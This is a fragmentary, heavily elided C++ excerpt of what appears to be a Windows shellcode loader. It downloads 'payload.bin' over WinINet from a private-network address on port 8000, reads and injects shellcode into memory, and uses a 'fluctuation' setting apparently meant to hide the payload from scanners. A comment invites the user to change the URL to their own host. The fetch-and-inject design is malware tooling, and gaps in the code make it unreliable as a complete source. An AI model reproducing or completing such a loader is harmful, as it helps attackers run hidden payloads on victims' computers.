...
std::vector<unsigned char> downloadContent(LPCWSTR url) {
    ...
    if (hInternet) {
        HINTERNET hUrlFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (hUrlFile) {
            DWORD bytesRead;
...
size_t WriteMemoryCallback(char *contents, size_t size, size_t nmemb, void *userp) {
    ...
    char **membufp = static_cast<char **>(userp);

    *membufp = static_cast<char *>(realloc(*membufp, realsize + 1));
    if (*membufp == nullptr) {
        std::cerr << "Error: out of memory" << std::endl;
        return 0;
    }

    memcpy(&(*membufp)[0], contents, realsize);
    (*membufp)[realsize] = 0; // null-terminate the string
    return realsize;
}

//bool readShellcode2(const std::string& url, std::vector<uint8_t>& shellcode) {
//   
//
//    shellcode.assign(membuf, membuf + strlen(membuf));
//    free(membuf);
//    return true;
//}
...
bool readShellcode(const LPCSTR path, std::vector<uint8_t>& shellcode)
{
...
bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
{
   ...
   ///me//////* if (!VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old))
   ////////     return false;*/
...
int run()
{
    ...
    try
    {
        g_fluctuate = (TypeOfFluctuation)atoi("1");
    }
    catch (...)
    {
        return 1;
    ...
    // this url should change by you ;p
    shellcode = downloadContent(L"http://192.168.56.104:8000/payload.bin");
